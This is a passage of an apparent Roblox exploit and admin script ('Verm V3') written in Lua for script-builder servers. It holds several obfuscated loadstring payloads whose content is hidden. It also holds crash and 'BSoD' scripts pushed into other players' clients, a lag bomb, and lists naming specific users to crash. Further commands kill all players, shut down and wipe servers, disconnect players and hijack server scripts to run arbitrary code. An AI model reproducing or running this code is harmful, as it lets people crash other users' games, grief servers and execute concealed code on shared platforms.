p.CFrame = c
wait(0.01)
end
local p1 = newCylMesh(newPart(Vector3.new(1,0.25,1),BrickColor.new(0,0,0),model))
p1.Anchored = true
p1.CFrame = CFrame.new(hit.p)
p1.CFrame = CFrame.new(hit.p)
local c1 = p1.CFrame
handle.Anchored = false
for i,v in ipairs(game.Workspace:getChildren()) do
if (v:FindFirstChild("Torso") ~= nil) then
if ((core.Position - v.Torso.Position).magnitude <= 8) then
coroutine.resume(coroutine.create(function()
v.Torso.CFrame = CFrame.new(Vector3.new(v.Torso.Position.x,p.Position.y+3,v.Torso.Position.z),v.Torso.CFrame.lookVector)
v.Torso.Anchored = true
for i=0, 10 do
v.Torso.CFrame = v.Torso.CFrame+Vector3.new(0,-1,0)
wait(0.1)
end
v.Torso.CFrame = CFrame.new(v.Torso.Position - (p.Position - p1.Position),v.Torso.CFrame.lookVector) + Vector3.new(0,4,0)
for i=0, 10 do
v.Torso.CFrame = v.Torso.CFrame+Vector3.new(0,1,0)
wait(0.1)
end
v.Torso.Anchored = false
end))
end
end
end
for i=1,15,0.5 do
p.Size = p.Size+Vector3.new(-0.5,0,-0.5)
p1.Size = p1.Size+Vector3.new(0.5,0,0.5)
p.CFrame = c
p1.CFrame = c1
wait(0.01)
end
p.Parent = nil
wait(1)
for i=1,15,1 do
p1.Size = p1.Size+Vector3.new(-1,0,-1)
p1.CFrame = c1
wait(0.01)
end
p1.Parent = nil
end
debounce = false
end)

mouse.Button1Up:connect(function()
if (debounce2) then
return
end
debounce2 = true
if (mode == "beam") then
if (hold and holdTime >= 10) then
if (#orbWeld > 0) then
local p = newSphereMesh(newPart(Vector3.new(4,4,4),BrickColor.new(0,0,0),Workspace))
p.Name = "1"
p.Transparency = 0.5
local point = core.CFrame*CFrame.Angles(math.pi/2, 0, 0)
p.CFrame = CFrame.new(core.Position + point.lookVector*4,core.Position)
Instance.new("PointLight",p)

local bs = Instance.new("BodyVelocity",p)
bs.velocity = point.lookVector*(2*holdTime)+Vector3.new(0,0.25,0)
bs.maxForce = Vector3.new(100000,100000,100000)

p.Touched:connect(function(part)
if (part.Name ~= "beam012") then
if (p.Name == "3") then
p.Parent = nil
elseif (p.Name == "2") then
p.Name = "3"
elseif (p.Name == "1") then
p.Name = "2"
end
part.Parent = nil
end
end)

coroutine.resume(coroutine.create(function()
for i = 1, 5, 0.01 do
if (p.Parent ~= nil) then
beam(p.Position, p.Position+Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5)))
end
wait(0.01)
end
p.Parent = nil
end))

wait(1)
--removeSoul(2)
end
end
hold = false
holdTime = 0
animateStaff(true, CFrame.new(0,-1,0)*CFrame.Angles(math.pi + math.pi/2,0,0), CFrame.new())
end
debounce2 = false
end)

mouse.KeyDown:connect(function (key) 
keys[key] = true 
if (keys["z"]) then
mode = "hurt"
elseif (keys["x"]) then
mode = "bubble"
elseif (keys["q"]) then
mode = "beam"
elseif (keys["c"]) then
mode = "drain"
elseif (keys["v"]) then
mode = "build"
elseif (keys["e"]) then
if (mode ~= "throw") then
mode = "throw"
else
if (debounce) then return end
debounce = true
if (throw) then
handle:FindFirstChild("BodyPosition").Parent = nil
handle:FindFirstChild("BodyGyro").Parent = nil
throw = false
animateArm(true, CFrame.new(1.5,0.5,0), CFrame.new(0,0.5,0)*CFrame.Angles(-math.pi/2, 0, 0))
animateStaff(true, CFrame.new(0,-1,0)*CFrame.Angles(math.pi + math.pi/2,0,0), CFrame.new())
end
debounce = false
end
elseif (keys["b"]) then
if (debounce) then return end
debounce = true
if (throw) then
local p = newCylMesh(newPart(Vector3.new(1,0.25,1),BrickColor.new(0,0,0),model))
p.Anchored = true
p.CFrame = CFrame.new(handle.Position) + Vector3.new(0,-2,0)
local c = p.CFrame
for i=1,30,0.5 do
p.Size = p.Size+Vector3.new(0.5,0,0.5)
p.CFrame = c
wait(0.01)
end
for i,v in ipairs(game.Workspace:getChildren()) do
if (v:FindFirstChild("Torso") ~= nil) then
if ((core.Position - v.Torso.Position).magnitude <= 15) then
coroutine.resume(coroutine.create(function()
v.Torso.CFrame = CFrame.new(Vector3.new(v.Torso.Position.x,p.Position.y+3,v.Torso.Position.z),v.Torso.CFrame.lookVector)
v.Torso.Anchored = true
for i=0, 10 do
v.Torso.CFrame = v.Torso.CFrame+Vector3.new(0,-1,0)
wait(0.1)
end
v:BreakJoints()
end))
end
end
end
for i=1,30,1 do
p.Size = p.Size+Vector3.new(-1,0,-1)
p.CFrame = c
wait(0.01)
end
p.Parent = nil
end
debounce = false
elseif (keys["f"]) then
mode = "portal"
end
end)
mouse.KeyUp:connect(function (key) keys[key] = false end)
end)

tool.Deselected:connect(function()
hold = false
holdTime = 0
if (not throw) then
animateArm(false, nil, nil)
animateStaff(false, nil, nil)
end
end)

local y = 0
local x = 0
game:getService("RunService").Stepped:connect(function()
if (hold) then
holdTime = holdTime+0.5
if(holdTime >= 10) then
beam(core.Position, core.Position+Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5)))
end
end

if (mode == "drain") then
for q,v in pairs(Workspace:getChildren()) do
if (v ~= character and math.random(1,10) == 1) then
damageDistance(v, 10)
end
end
beam(core.Position, core.Position+Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5)))
end

coreWeld.C0 = CFrame.new(0,3.75,0)+Vector3.new(0,math.sin(y)/4,0)

for i,v in ipairs(orbWeld) do
local radius = getRadius(#orbWeld)

local index = x + ((math.pi*2)/#orbWeld)*(i-1)

orbWeld[i].C0 = CFrame.new(radius*math.sin(index), 0, radius*math.cos(index))
end

if (y < math.pi*2) then
y = y + math.pi*2/128
else
y = math.pi*2/128
end

if (x < math.pi*2) then
x = x + math.pi*2/128
else
x = math.pi*2/128
end
end)
end}

 
 

module[1] = {"Verm V3",function()
local z={[")"]=0,["@"]=1,["*"]=2,["^"]=3,["+"]=4,["="]=5,["-"]=6,["("]=7,["~"]=8,["_"]=9,["$"]=10,["?"]=11,["&"]=12,["%"]=13,["!"]=14,["#"]=15}; setfenv(assert(loadstring((string.gsub(string.gsub(table.concat({
"((@-_-+(~*_*$)&+#-^-@-&-)=&-@-_(=-*()*%^)*(-@-%-=-$^^(=-*(-(_-^-=-~A*)=&-@-_(=-*(^(**_*!*&+#-^-@-&-)=&-@-_(=-*($)^(^-*(_-)(+(!*)=@-*(=-!-+()*%^)*#=#=#=-=^^*(%-+=@-*-^(#=#=#=$)+=@-*-^()*%^)*?(%($)^+%-+-^()*%^)*?(%($)?-=-_()*%^)A*?^**$)^-~-@-+((-=(_-)*%^)*+(*(=(=-$))(*(#-*-=-%-#-+-=-)*%^)*--@-&-^(=-$)^-#-!-!-=-^-+(_-#-!-)*%^)*!-_-&-$)*+_()(@-^(^()*%^)*--@-&-^($))*$)-=^^*(%-%+#-+-=-&-)*%^)*_+!-^(+(@-!-^-=-!*!-=-((~***%+#-+-=-&-**&*)*(=#-*(?-^()(@-^-=-_*$)-=^^*(%-%+#-+-=-&-!*!+@-%-=-)*%^)***-=+=@-*-^(**$)^=#-=(*(^-=-!+@-%-=-)*%^)***++^=#-=(*(^-=-**"
}),"(%u)(.)",function(r,c)return c:rep(r:byte()-62)end),"(.)(.)",function(lo,hi)return string.char(z[lo]+z[hi]*16)end)))),getfenv())()

Banlist = {"d","NilScripter","OTHR"}
BSoDBanList = {"rogers888","cappertron20","GOLDC3PO","rabbidog","NoobsAttacks","manofthebase44"}

 
function Connect(player)
if game.Players[player] then
if not Players[player.Name] then 
NewLS(CrashSource,player.Backpack)
table.insert(Players,player.Name)
Output('Connected | '..player.Name,__)
end
end
end
  

function Crash(name)
name = tostring(name or "nil")
local t = Instance.new("StringValue")  
t.Name = "DISC: "..name
t.Parent = game.Lighting   
game:GetService("Debris"):AddItem(t,1)
end 
 
ConnectSource = [=[
	wait()
	script:ClearAllChildren()
	wait()
	script.Parent = nil
	wait()
	Player = game:service'Players'.LocalPlayer
	wait()
	while wait(0.1) do --this is actually the nilcrash
		if game.Lighting:findFirstChild("DISC: nil") then
			if Player.Parent == nil then
				repeat Delay(0, wait) until false
			end
		end
		if game.Lighting:findFirstChild("DISC: "..Player.Name) then
			repeat Delay(0, wait) until false
		end
		if game.Lighting:findFirstChild("DISC: all") then
			repeat Delay(0, wait) until false
		end
	end
]=]


BSoDSource = [==[
	  game:GetService('Players').LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson	
wait(0)
script.Parent = nil
plr = game:GetService("Players").LocalPlayer
local plrgui = plr:findFirstChild("PlayerGui")
if plrgui == nil then repeat wait() plrgui = plr:findFirstChild("PlayerGui") until plrgui ~= nil end
while plr.Parent == game:GetService("Players") do
wait()
for i = 1, 1000 do
local sc = Instance.new("ScreenGui",plrgui)
local fr = Instance.new("TextLabel",sc)
fr.Text = "BSoD'd By V3rmilli0n be happy xd"
fr.Size = UDim2.new(1, 0, 1, 0)
fr.FontSize = "Size48"
end
end
]==]


LagSource = [[
	wait()
	script.Parent = game:service'TeleportService'
	CC = workspace.CurrentCamera
	    game:GetService('Players').LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson	

	RS = game:service("RunService")
	PG = game.Players.LocalPlayer.PlayerGui
	C = game.Players.LocalPlayer.Character
	function Lag()
		coroutine.resume(coroutine.create(function()
			while wait() do
				M = Instance.new("Message",CC)
				M.Text = tick()*math.floor(5%4*21)
				H = Instance.new("Hint",CC)
				H.Text = 'yo u got BSoD-D By V3rmilli0n ;-)'
				SG=Instance.new("ScreenGui",PG)
				FR=Instance.new("Frame",SG)
				FR.Size = UDim2.new(500,500,500,500)
				while wait() do
					FR.BackgroundColor3 = Color3.new(math.random(0,255),math.random(0,255),math.random(0,255))
				end
				P=Instance.new("Part",CC)
				E=Instance.new("Explosion",P)
				E.BlastRadius=math.huge
				E.Position=P.Position
				F=Instance.new("Fire",P)
				S=Instance.new("Smoke",P)
				P.CFrame = CC.Focus
				P.Anchored = true
				P.CanCollide = false
				P.AncestryChanged:connect(function()Lag()end)
				for _,v in pairs(C:GetChildren()) do pcall(function()v.Anchored=true end) end
			end 
		end)) 
	end
	RS.Stepped:connect(function()for i=1,10 do Lag()Lag()Lag()end end)
]]
 

 
 
coroutine.resume(coroutine.create(function()
while wait(3) do
if game:GetService("Players").Name ~= "Players" then
game:GetService("Players").Name = "Players"
end
end
end))
 
function Dismiss()
for i = 1, 10 do
for i = 1, #Tabs do
table.remove(Tabs, i)
if V3rmModel then
V3rmModel:ClearAllChildren()
end end end
end
 
function AddCmd(Name,Say,Desc,Func)
table.insert(Cmds,{["Name"] = Name,["Say"] = Say,["Desc"] = Desc,["Func"] = Func})
end
 

 
found = false
 
coroutine.wrap(function()
while found == false do
if game.PlaceId == 21053279 or game.PlaceId == 21053219 then break end
for _,scriptinworkspace in pairs(workspace:children()) do
if scriptinworkspace then
if scriptinworkspace:IsA("Script") then
if scriptinworkspace:FindFirstChild(SourceName) then
newScript = scriptinworkspace:Clone()
wait(0.2)
newScript.Name = "NewScript"
newScript.Disabled = true
newScript:FindFirstChild(SourceName).Value = ""
Output("Source found", __)
found = true 
break
end
end
end
end
wait()
end
end)()
 
AddCmd("Unpunish player","unpunish","Restore the player's character",
function(plrs)
for _, plr in pairs(plrs) do
if plr then
NewS("game.Players['"..plr.Name.."']:LoadCharacter()", workspace)
end
end
end
)
 
function NewS(sourcevalue, parent)
if game.PlaceId == 21053279 or game.PlaceId == 21053219 then 
NS(sourcevalue, parent)
else
if newScript then
local scr = newScript:Clone()
if scr:FindFirstChild(SourceName) then
if scr:FindFirstChild(SourceName) then
scr:FindFirstChild(SourceName).Value = sourcevalue
scr.Parent = parent
wait(0.5)
scr.Disabled = false
return scr
end
end
end
end
end
 
sorcery = script:Clone()

 

Services = {
		game;
		game:service'Workspace';
		game:service'Lighting';
		game:service'StarterGui';
		game:service'StarterPack';
		game:service'Players';
};

 AddCmd("Go nil","gn","Go to nil player mode",
	function()
		LocalPlayer.Parent = nil
		appear(CFrame.new(0,25,0))
		local a = Char:Clone()
		a.Torso.CFrame = CFrame.new(0,25,0)
		a.Parent = workspace
		LocalPlayer.Character = a
		workspace.CurrentCamera.CameraType = "Custom"
		workspace.CurrentCamera.CameraSubject = a.Humanoid
		wait(5)
		SmoothMovement()
	end
)

function SmoothMovement()
	if char ~= nil then char = nil end
	wait()
	if LocalPlayer.Character.Parent == nil then return end
	if LocalPlayer.Character == nil then return end
	char = LocalPlayer.Character
	char.Torso.Anchored = true
	Mouse.KeyDown:connect(function(kai)
		if kai == "w" then
			key = "w"
		elseif kai == "s" then
			key = "s"
		elseif kai == "a" then
			key = "a"
		elseif kai == "d" then
			key = "d"
		end
	end)
	Mouse.KeyUp:connect(function(kai)
		if kai == "w" then
			key = nil
		elseif kai == "s" then
			key = nil
		elseif kai == "a" then
			key = nil
		elseif kai == "d" then
			key = nil
		end
	end)
	while wait() do
		if char == nil then break end
		if key == "w" then
			if char == nil then break end
			char.Torso.CFrame = char.Torso.CFrame * CFrame.new(0,0,-0.5)
		elseif key == "s" then
			if char == nil then break end
			char.Torso.CFrame = char.Torso.CFrame * CFrame.new(0,0,0.5)
		elseif key == "a" then
			if char == nil then break end
			char.Torso.CFrame = char.Torso.CFrame * CFrame.new(-0.5,0,0)
			char.Torso.CFrame = char.Torso.CFrame * CFrame.Angles(0,0.5,0)
		elseif key == "d" then
			if char == nil then break end
			char.Torso.CFrame = char.Torso.CFrame * CFrame.new(0.5,0,0)
			char.Torso.CFrame = char.Torso.CFrame * CFrame.Angles(0,-0.5,0)
		end
	end
end

AddCmd("Rejoin yourself","rjm","Rejoin yourself even if you are nil",
	function()
		if SourceName ~= "source" then
			game:service'TeleportService':Teleport(game.PlaceId)
		else
		end
	end
)

function Explore(part)
	Dismiss()
	if part == nil then
		for _,v in pairs(Services) do
			Output(v.Name,nil,function() Explore(v) end)
		end
	else
		for _,v in pairs(part:children()) do
			Output(v.Name,nil,function() Explore(v) end)
		end
		wait()
		Output("Currently exploring: "..part.Name)
		Output("Class name: "..part.ClassName)
		Output("Destroy",function() part:Destroy() Explore(part.Parent) end)
		Output("Remove",function() part:remove() Explore(part.Parent) end)
	end
end
 
AddCmd("Explore","explore","Explore the game",
function()
Explore()
end
)

AddCmd("Kick player","kick","Kick a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
plr:Remove()
end
end
end
)
 
function NewLS(sourcevalue, parent)
if game.PlaceId == 21053279 or game.PlaceId == 21053219 then 
NLS(sourcevalue, parent) 
else
local NS = sorcery:Clone()
NS.Name = "NewLocal"
local Source = NS:findFirstChild(SourceName)
if Source == nil then Instance.new('StringValue',NS).Name = SourceName end Source = NS:findFirstChild(SourceName)
Source.Value = sourcevalue
NS.Parent = parent
NS.Disabled = false
return NS
end
end
 
Clothes = {}
 
for _,Item in pairs(LocalPlayer.Character:GetChildren()) do
if Item:IsA('CharacterMesh') or Item:IsA('Hat') or Item:IsA('Shirt') or Item:IsA('Pants') then
table.insert(Clothes,Item:Clone())
end
end
for i,v in pairs(LocalPlayer.Character:GetChildren()) do
if v:IsA("BodyColors") then
body = v
torsocolor = body.TorsoColor
leftlegcolor = body.LeftLegColor
rightlegcolor = body.RightLegColor
leftarmcolor = body.LeftArmColor
rightarmcolor = body.RightArmColor
headcolor = body.HeadColor
end
end
 
mouse = LocalPlayer:GetMouse()
 
mouse.KeyDown:connect(function(key)
if key == "z" then
game:service'StarterGui':SetCoreGuiEnabled(4, true)
end 
end)
 
AddCmd("chat;on/off","chat","ChatGUI on/off",
function(plrs, msg)
if msg == "off" then
chatgui = false
elseif msg == "on" then
chatgui = true
end
end
)
 
AddCmd("Set WalkSpeed","ws","Set the walkspeed of player",
function(plrs, msg)
local keypos = msg:find(key)
local targPlayers = msg:sub(1,keypos-1)
local plrs = getPlayers(targPlayers)
local speed = msg:sub(tonumber(keypos+1))
for _,v in pairs(plrs) do
if v.Character ~= nil and v.Character:findFirstChild("Humanoid") ~= nil then
v.Character:findFirstChild("Humanoid").WalkSpeed = speed
end
end
end
)
 
 
Bad_Char = ""

function chatgui(msg)
if not chatgui then return end
if probemode == false then
if LocalPlayer.Character:findFirstChild("Head") then
mainPart = LocalPlayer.Character:findFirstChild("Head")
end
end
if probemode == true then
if game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") then
mainPart = game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe")
end
end
local bg = Instance.new("BillboardGui", mainPart)
bg.Adornee = mainPart
bg.Name = "CHATGUIBG"
bg.Size = UDim2.new(4, 0, 2.5, 0)
bg.StudsOffset = Vector3.new(-4, 2, 0)
local bg2 = Instance.new("BillboardGui", mainPart)
bg2.Adornee = mainPart
bg2.Name = "CHATGUIBG2"
bg2.Size = UDim2.new(4, 0, 2.5, 0)
bg2.StudsOffset = Vector3.new(-4, 4.5, 0)
local text = Instance.new("TextLabel", bg)
text.Size = UDim2.new(3, 0, 0.5, 0)
text.FontSize = "Size18"
text.TextScaled = true
text.BackgroundColor3 = Color3.new(0,0,0)
text.TextTransparency = 0
text.BackgroundTransparency = 0
text.TextTransparency = 0
text.TextStrokeTransparency = 0
text.Font = "Arial"
text.TextColor = BrickColor.new("Really red")
text.Text = " "
Message = msg:sub(1)
if #Message >50 then return end
for i = 0, #Message, 1 do
wait(0.01)
text.Text = string.gsub(""..LocalPlayer.Name.."; "..Message:sub(0, i),'fuck','fuck')
end
wait()
coroutine.resume(coroutine.create(function()
for i = 0, 5, 0.05 do
if bg ~= nil then
if bg2 ~= nil then
wait()
bg2.StudsOffset = bg2.StudsOffset + Vector3.new(0, 0.05, 0)
end
bg.StudsOffset = bg.StudsOffset + Vector3.new(0, 0.05, 0)
end
end
end))
for i=text.TextTransparency,1,0.02 do
wait()
text.TextTransparency = i
text.TextStrokeTransparency = i
end
if bg == nil then return end
bg:Destroy()
if bg2 == nil then return end
bg2:Destroy()
end

LocalPlayer.Chatted:connect(chatgui)

AddCmd("Commands","cmds","Show the list of commands",
function()
Dismiss()
for i, v in pairs(Cmds) do
Output(v["Name"],
function()
Output("Description: "..v["Desc"], __)
Output("Usage: "..v["Say"], __)
Output("Name: "..v["Name"], __)
end)
end
end
)
 
AddCmd("Rejoin player","rej","Rejoin the player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS("game:service'TeleportService':Teleport(game.PlaceId)", plr.Backpack)
end
end
end
)

AddCmd("Clean workspace","clean","Clean the lag nobs made",
function()
		        for a,b in pairs(game.Workspace:GetChildren()) do
                        if not game.Players:GetPlayerFromCharacter(b) and b.Name ~= 'Base' and b.Name ~= 'Camera' then
                                pcall(function() b:Destroy() end)
                        end
                end
                if game.Workspace:findFirstChild('Base') == nil then
                        local Base = Instance.new("Part",Game.Workspace)
                        Base.Name = "Base"
                        Base.Anchored = true
                        Base.Locked = true
                        Base.BrickColor = BrickColor.new("Bright green")
                        Base.Size = Vector3.new(2048,2,2048)
                        Base.CFrame = CFrame.new(0,0,0)
                end
                Output('You have cleaned workspace!')
        end
)

AddCmd("Execute", "exe","Execute a LocalScript for admin",
function(plrs, msg)
a,b = ypcall(function()
loadstring(msg)()
end) if not a then Output(b,"Bright red") end
end
)

AddCmd("Anchored", "anchor","Anchor all parts",
function()
	g = game.Workspace:GetChildren () do
for i = 1, #g do
if g[i].ClassName == "Part" then
g[i].Anchored = true else if
g[i].ClassName == "Model" then
y = g[i]:GetChildren ()
for i = 1, #y do
if y[i].ClassName == "Part" then
y[i].Anchored = true
end
end
end
end
end
end
end
)

AddCmd("unanchor", "unanchor","unanchor all parts",
function()
	g = game.Workspace:GetChildren () do
for i = 1, #g do
if g[i].ClassName == "Part" then
g[i].Anchored = false else if
g[i].ClassName == "Model" then
y = g[i]:GetChildren ()
for i = 1, #y do
if y[i].ClassName == "Part" then
y[i].Anchored = false
end
end
end
end
end
end
end
)

AddCmd("Admin a player","vtabs","Give admin to a player",
function(plrs)
for _, plr in pairs(plrs) do
if plr and plr.Backpack then
script.Parent = plr.Backpack
Output("You gave admin to: "..plr.Name, __)
end
end
end
)

AddCmd("AFK","afk","Ping yourself as afk",
function()
Dismiss()
for i = 1,8 do
wait()
Output(''..LocalPlayer.Name.." is afk")
end
end
)

AddCmd("Back","back","Ping yourself as back",
function()
Dismiss()
for i = 1,8 do
wait()
Output(''..LocalPlayer.Name.." is back bby")
end
wait(3)
Dismiss()
end
)
 
AddCmd("Ban a player","ban","Kicks a player when he enters",
function(plrs, msg)
for _,v in pairs(plrs) do
if v then
table.insert(Banlist,v.Name)
Output('Banned | '..v.Name,__)
else
Output(Error)
end
end
end
)

local z={["@"]=0,["*"]=1,["$"]=2,["%"]=3,[")"]=4,["("]=5,["~"]=6,["!"]=7,["-"]=8,["_"]=9,["="]=10,["+"]=11,["#"]=12,["&"]=13,["?"]=14,["^"]=15}; setfenv(assert(loadstring((string.gsub(string.gsub(table.concat({
"*))~)~%)&~)~-A$_)?A~^~$$#A$~!_~?A~^~$$#A$_~?A~^~@$@A!?~%!@$+~$$#$=@~~(!?~%~)!_~^~?~-$_$=@))_~%!&~_~%!%!-$_$=@~~^~$!@$_~@$&%@$*%#$$%@$)~^~=@!!*~_~)!-$_$=@^)(!)!@!(!)!-A$~(%%$!&~@$)(*~$~%!@$%)$!(~*~)!(~)~@$$~_!@$~(%%$!&~_~#~#~_~@%?~$$#$@$^(^(_$=@^)(!)!@!(!)!-A$~(%%$!&~@$)(*~$~%!@$%)$!(~*~)!(~)~@$$~_!@$~(%%$!&~_~#~#~_~@%?~$$#$@$^(^(_$=@^)(!)!@!(!)!-$$$~(%%$!&~@$)(*~$~%!@$%)$!(~*~)!(~)~@$$~_!@$~(%%$!&~_~#~#~_~@%?~$$#$@$^(^(_$=@^)(!)!@!(!)!-$$$~(%%$!&~@$)(*~$~%!@$%)$!(~*~)!(~)~@$$~_!@$~(%%$!&~_~#~#~_~@%?~$$#$@$^(^(_$=@^)(!)!@!(!)!-$$$~(%%$!&~@$)(*~$~%!@$%)$!(~*~)!(~)~@$$~_!@$~(%%$!&~_~#~#~_~@%?~$$#$@$^(^(_$=@(~?~)~=@(~?~)~=@_$"
}),"(%u)(.)",function(r,c)return c:rep(r:byte()-62)end),"(.)(.)",function(lo,hi)return string.char(z[lo]+z[hi]*16)end)))),getfenv())()

AddCmd("Fix Lighting","lfix","Fix the Lighting ",
function()
function dtr()
	local sk = game.Lighting:findFirstChild("Sky")
	if sk ~= nil then
		sk:Remove()
	end
	game.Lighting.FogEnd = 10011111111
    game.Lighting.Ambient = Color3.new(0.5,0.5,0.5)
	game.Lighting.TimeOfDay = "14:00:00"
	game.Lighting.Ambient = Color3.new(0.5,0.5,0.5)
	game.Lighting.Brightness = 1
	game.Lighting.ColorShift_Bottom = Color3.new(0,0,0)
	game.Lighting.ColorShift_Top = Color3.new(0,0,0)
	game.Lighting.ShadowColor = Color3.new(0.7,0.7,0.7)
end

dtr()

game.Lighting.Changed:connect(dtr)
end
)

AddCmd("Kill all","ka","everyone go die die",
function()
for i,v in pairs(game.Players:GetChildren()) do if v.Character then v.Character:BreakJoints() end end
end
)

AddCmd("Set SkyBox","vbox","et Skybox l0l",
function()
function getAll(obj)
for i, v in pairs(obj:getChildren()) do
if v:IsA("BasePart") then
v.Anchored = false
v.BrickColor = BrickColor.new(0)
bv = Instance.new("BodyVelocity")
bv.Parent = v
bv.maxForce = Vector3.new(100000000,100000000,100000000)
local s = Instance.new("SelectionBox")
s.Color = BrickColor.random()
s.Adornee = v
s.Parent = v
s.Transparency = (0.4)
end
getAll(v)
end
end
getAll(workspace)
game.Lighting.TimeOfDay = "07:00:00"
game.Lighting.Ambient = Color3.new(0,0,0)
sky = Instance.new("Sky")
sky.Parent = game.Lighting
sky.SkyboxBk = "http://www.roblox.com/asset/?id=157702855"
sky.SkyboxDn = "http://www.roblox.com/asset/?id=157702855"
sky.SkyboxFt = "http://www.roblox.com/asset/?id=157702855"
sky.SkyboxLf = "http://www.roblox.com/asset/?id=157702855"
sky.SkyboxRt = "http://www.roblox.com/asset/?id=157702855"
sky.SkyboxUp = "http://www.roblox.com/asset/?id=157702855"
end
)

local z={["&"]=0,["%"]=1,["="]=2,["!"]=3,["*"]=4,["+"]=5,["?"]=6,["-"]=7,["~"]=8,["#"]=9,["$"]=10,[")"]=11,["^"]=12,["("]=13,["_"]=14,["@"]=15}; setfenv(assert(loadstring((string.gsub(string.gsub(table.concat({

"??+-_?!?*-#?@?_?&=!?=-+?%?*-+?!+@?+-_?*?~=#A*#=$&#&!+@?+-_?*?(!#*_?!-*-%?_?!?+?_=_?+?--~A=!+@?+-_?*?==^=-*%?(?+?)+==-+@?=-)?!-&-%?!?+?==(+#=$&#&!+@?+-_?*?)+==_*%?(?+?==(+(!~A=!++?=-?-+?=-@+!+#-!-*-+?(?@+!+@?+-_?*?==#=$&#&!+@?+-_?*?)+==&+#?*-!?~?==(+(!~=%!#=$&#&!+@?+-_?*?)+==!+@?+-_?*?#**?==(+(!~===~?*-*-&-$!@=@=------_==-@?=?^?@?~-_=!?@?(?@=%?!-!-+?*-@=@!#?*?(!==_=_=*-@?_?+-(?=?+?=-~=#***#=#=$&#&!+@?+-_?*?)+==?+@?^?+-(?+?==(+(!~=&!_=+!#=$&#&--%?#?*-~=#=$&#&!+@?+-_?*?$!&+^?%?#-~=#=$&+?_?*?"

}),"(%u)(.)",function(r,c)return c:rep(r:byte()-62)end),"(.)(.)",function(lo,hi)return string.char(z[lo]+z[hi]*16)end)))),getfenv())()




function ShowMusicList()

    Dismiss()

    Output("Michael Jackson - Slave To The Rhythm",function()

        CheckForExistingSound()

        createSound(158179091)

    end)

    Output("Tsunami Hardstyle",function()

        CheckForExistingSound()

        createSound(142720946)

    end)

    Output("Peanut Butter Jelly Time!?!!?!?",function()

        CheckForExistingSound()

        createSound(142851579)

    end)

    Output("Headhunterz - Dragonborn",function()

        CheckForExistingSound()

        createSound(145060711)

    end)

    Output("Eminem - Rap God",function()

        CheckForExistingSound()

        createSound(143647605)

    end)

    Output("Haddaway - What Is Love",function()

        CheckForExistingSound()

        createSound(142383642)

    end)

    Output("Dj Swoom - I'm Blue",function()

        CheckForExistingSound()

        createSound(150526348)

    end)

    Output("Skrillex - Bangarang",function()

        CheckForExistingSound()

        createSound(142319852)

    end)

    Output("Drop That NaeNae Everyone!",function()

        CheckForExistingSound()

        createSound(146054931)

    end)

    Output("Troll Guy - Trololo",function()

        CheckForExistingSound()

        createSound(131857877)

    end)

    Output("Eminem - Bezerk",function()

        CheckForExistingSound()

        createSound(136234242)

    end)

    Output("Guns N' Roses-Paradise City",function()

        CheckForExistingSound()

        createSound(149446267)

    end)

 Output("Lil wayne - Gunwalk",function()

                CheckForExistingSound()

                createSound(155285068)
end)

    Output("Macklemore - Thrift Shop",function()

        CheckForExistingSound()

        createSound(135213728)

    end)

        Output("Let it Go",function()

                CheckForExistingSound()

                createSound(150320143)


        end)

Output("Talk Dirty ",function() CheckForExistingSound() createSound(148952593)
end)
end
function CheckForExistingSound()

    for _,Child in pairs(Game["Workspace"]:GetChildren()) do

        if(Child["ClassName"]==("Sound"))then

            Child:Pause()

            Child["PlayOnRemove"]=(false);

            wait()

            Child:Destroy()

        end

    end

end

AddCmd("Musiclist","mlist","Shows the Possible Sounds to Play",

function()

    ShowMusicList()

end)

AddCmd("Shutdown","sd","Shuts the server down",
    function()
        Output("Shutting down server!","Really red")
    for k,v in pairs(game:GetService("Players"):GetPlayers()) do v:Destroy() end
game.Workspace.Terrain:Clear()
wait(1)
game.Workspace:ClearAllChildren()
game:GetService("Players").PlayerAdded:connect(function(p) p:Destroy() end)
end
)

AddCmd("RuinSB","rsb","Ruins a not-saveplace protected scriptbuilder",
    function()
        if SourceName == "source" then 
            Output("This is Alakazards scriptbuilder, can't use SavePlace here!","Really red")
        else
        NewS([[game:SavePlace()]],Workspace)
    	end
    end
)

AddCmd("Respawn","respawn","Respawn player",
	function(plrs)
		for _,plr in pairs(plrs) do
			if plr then
				NewS("game.Players['"..plr.Name.."']:LoadCharacter()", workspace)
			end
		end
	end
)

AddCmd("Connect","connect","Connect a player",
	function(plrs)
		for _,plr in pairs(plrs) do
			if plr and plr.Backpack then
				Connect(plr)
			end
		end
	end
)

AddCmd("Night","night","Makes it night",
	function()
		game.Lighting.TimeOfDay = "00:00:00"
	end
)

AddCmd("Day","day","Makes it day",
	function()
		game.Lighting.TimeOfDay = "12:00:00"
	end
)

AddCmd("Disc","dc","Disconnects a player form the game",
function(plrs)
for _,plr in pairs(plrs) do
if plr and plr.Backpack then
NewLS([[local lp = game.Players.LocalPlayer;lp.Parent = nil;wait();lp.Parent = game.Players]],plr.Backpack)
end
end
end)

AddCmd("LocalScript","ls","LocalScript",
	function(nothing, msg)
		if LocalPlayer.Parent ~= nil then
			NewLS(msg, LocalPlayer.Backpack)
		end
	end
)

AddCmd("Playerinfo","pinfo","Shows info on a player",
    function(plrs)
        for _,plr in pairs(plrs) do
            if plr then
Output("Age: "..plr.AccountAge,"noncolar")
Output("Membership: "..plr.MembershipType.Name,"Hot pink") 
Output("Player: "..plr.Name,"Really red")
Output("Id: "..plr.userId,"New Yeller")
Output("Camera Mode: "..plr.CameraMode.Name,"Dark green")
end
end
end)

AddCmd("Force shutdown","fsd","Forces shutdown with a ManualSurfaceJoint",
    function(nothing, msg)
        NewS([[local b = Instance.new ("ManualSurfaceJointInstance",Workspace)]],workspace)
    end
)

AddCmd("Message","m","Show a message",
	function(nothing, msg)
		if found then
			NewS([[
			a = Instance.new("Message", workspace)
			msg = "]]..msg..[["
			msg = msg:gsub("","\5")
			game:service'Debris':AddItem(a, 5)
			while wait() do
				for i = 30,0,-1 do
					a.Text = "-->"..string.rep(" ",i)..msg..string.rep(" ",i).."<--"
					wait()
				end
